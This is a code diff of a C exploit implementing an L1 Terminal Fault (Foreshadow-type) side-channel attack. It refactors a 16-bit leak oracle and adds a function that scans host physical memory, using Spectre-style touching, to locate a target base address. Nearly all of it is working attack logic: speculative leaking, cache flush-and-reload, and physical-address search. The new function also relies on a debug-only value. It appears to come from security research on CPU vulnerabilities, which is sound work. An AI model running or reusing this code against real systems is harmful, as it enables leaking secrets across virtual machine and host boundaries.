@@ -603,9 +603,8 @@ static leak_addr_t leak_addr;
 static int halt_counter = 1;
 static int fd_halt = -1;
 
-static int l1tf_oracle16_touch(void *p, uintptr_t pa, int nr_tries) {
+static int l1tf_oracle16(uint16_t magic, uintptr_t pa, int nr_tries, void *touch) {
   l1tf_leak_buffer_modify(&leak_addr, pa);
-  uint16_t magic = *(uint16_t *)p;
 
   int hits = 0;
   for (int i = 0; i < nr_tries; i++) {
@@ -614,7 +613,8 @@ static int l1tf_oracle16_touch(void *p, uintptr_t pa, int nr_tries) {
       for (int r = 0; r < 2; r++)
         assert(write(fd_halt, NULL, 0) == 0);
     }
-    *(volatile char *)p;
+    if (touch)
+      *(volatile char *)touch;
     lfence();
     flush(1, rbuf16[magic]);
     asm_l1tf_leak_2_highest_bytes(leak_addr.leak+(pa & 0xfff), rbuf16);
@@ -627,23 +627,22 @@ static int l1tf_oracle16_touch(void *p, uintptr_t pa, int nr_tries) {
 
 uintptr_t l1tf_find_page_pa(void *p)
 {
-  const int verbose = 1;
+  const int verbose = 2;
 
 #if DEBUG
   uintptr_t real_pa = helper_find_page_pa(p);
-  if (verbose) printf("l1tf_find_page_pa: the real pa is at %10lx\n", real_pa);
+  if (verbose >= 1) printf("l1tf_find_page_pa: the real pa is at %10lx\n", real_pa);
 #endif
 
   uint64_t t_start = clock_read();
 
   *(uint64_t *)p = rand64();
 
-
   for (int run = 0; run < 100; run++) {
     uintptr_t start = 0; uintptr_t end = HOST_MEMORY_SIZE;
     // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
     for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
-      if (verbose) if (pa % (16*1024*1024) == 0) {
+      if (verbose >= 2) if (pa % (16*1024*1024) == 0) {
         printf("l1tf_find_page_pa: run %3d  |  pa  %12lx", run, pa);
         fflush(stdout);
         printf("\33[2K\r");
@@ -653,13 +652,15 @@ uintptr_t l1tf_find_page_pa(void *p)
       for (off = 0; off < 8; off += 2) {
         char *q = (char *)p + off;
         uintptr_t pa_q = pa + off;
-        int hits = l1tf_oracle16_touch(q, pa_q, 10 + off*1000);
+        uint16_t magic = *(uint16_t *)q;
+        int iters = 10 + off*1000;
+        int hits = l1tf_oracle16(magic, pa_q, iters, q);
         if (!hits)
           break;
-        if (verbose) printf("l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
+        if (verbose >= 1) printf("l1tf_find_page_pa: run %3d  | va %14p  |  pa %12lx  |  hits %4d\n", run, q, pa_q, hits);
       }
       if (off == 8) {
-        if (verbose) {
+        if (verbose >= 1) {
           double time = (clock_read()-t_start)/1000000000.0;
           uintptr_t len = (pa-start) + run*(end-start);
           printf("l1tf_find_page_pa: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
@@ -668,6 +669,51 @@ uintptr_t l1tf_find_page_pa(void *p)
       }
     }
   }
+  return -1;
+}
+
+uintptr_t l1tf_find_base(void)
+{
+  const int verbose = 2;
+
+#if DEBUG
+  uintptr_t real_pa = helper_base_pa();
+  if (verbose >= 1) printf("l1tf_find_base: base's real pa is %10lx\n", real_pa);
+#endif
+
+  spectre_touch_base_start();
+  uint64_t t_start = clock_read();
+
+  for (int run = 0; run < 10000; run++) {
+    // uintptr_t start = 0; uintptr_t end = HOST_MEMORY_SIZE;
+    // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
+    uintptr_t start = real_pa; uintptr_t end = real_pa+1;
+    for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
+      if (verbose >= 2) if (pa % (16*1024*1024) == (start & 0xfff)) {
+        printf("l1tf_find_base: run %3d  |  pa  %12lx", run, pa);
+        fflush(stdout);
+        printf("\33[2K\r");
+      }
+
+      int off;
+      for (off = 0; off < 16; off += 8) {
+        int hits = l1tf_oracle16(0xffff, pa+off, 1000+off*1000, NULL);
+        if (!hits)
+          break;
+        if (verbose >= 1) printf("l1tf_find_base: run %3d  | pa %12lx  |  hits %4d\n", run, pa+off, hits);
+      }
+      if (off == 8) {
+        if (verbose >= 1) {
+          double time = (clock_read()-t_start)/1000000000.0;
+          uintptr_t len = (pa-start) + run*(end-start);
+          printf("l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
+        }
+        spectre_touch_base_stop();
+        return pa;
+      }
+    }
+  }
+  spectre_touch_base_stop();
   return -1;
 }
 
